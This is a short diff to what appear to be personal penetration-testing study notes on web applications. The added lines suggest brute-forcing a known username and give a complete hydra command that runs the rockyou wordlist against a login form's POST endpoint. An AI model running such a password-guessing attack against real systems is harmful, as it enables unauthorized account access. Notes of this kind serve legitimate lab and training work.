@@ -1,7 +1,9 @@
 
 # Web Applications
 - **Can run on any port, normally on 80 or 8080**
-
+- if you know the username, just brute it with hydra
+  - hydra -l admin -P /usr/share/wordlists/rockyou.txt [ip] http-post-form /department/login.php:"username=^USER^&password=^PASS^:Invalid Password"
+ 
 ## What are they?
 - they are a variety of applications running 
 
